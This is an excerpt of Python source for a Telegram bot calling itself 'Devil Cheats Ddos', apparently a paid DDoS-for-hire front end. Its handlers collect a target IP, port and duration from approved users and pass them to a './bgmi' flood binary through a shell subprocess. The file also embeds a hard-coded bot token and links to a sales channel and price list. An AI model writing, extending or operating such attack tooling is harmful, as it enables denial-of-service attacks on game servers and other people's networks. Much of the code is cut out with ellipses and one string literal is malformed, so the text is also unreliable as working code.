...
TOKEN = '8024773844:AAFP7ZXhwRdGA6Dpj5s42NZbvoQHY2KdxxE'
...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="🔥 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🔥", url="https://t.me/+OFyVsHB8h8k5NTk1")
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 200 200")
...
def handle_attack_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "*❤️‍🩹Provide >> ip Port Time.*", 
                                   reply_markup=create_inline_keyboard(), parse_mode='Markdown')
...
def process_attack_command(message):
    try:
        ...
        bot.attack_in_progress = False  # Mark that an attack is in progress
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/+OFyVsHB8h8k5NTk1")
            markup.add(button1)
            markup.add(button2)
        else:
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*Welcome To Devil Cheats Ddos"
 "Dm/owner To Got Approval"
 "Type/myinfo For Informetion"
 "Type/attack For Launch Attack"
 "Type/help For Get Help"
 "Type/rules For Read Ddos Rules"
                                           reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
...
def canary_command(message):
    ...
    button1 = types.InlineKeyboardButton(
        ...
        url="https://t.me/+OFyVsHB8h8k5NTk1")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://t.me/c/2181663380/167")
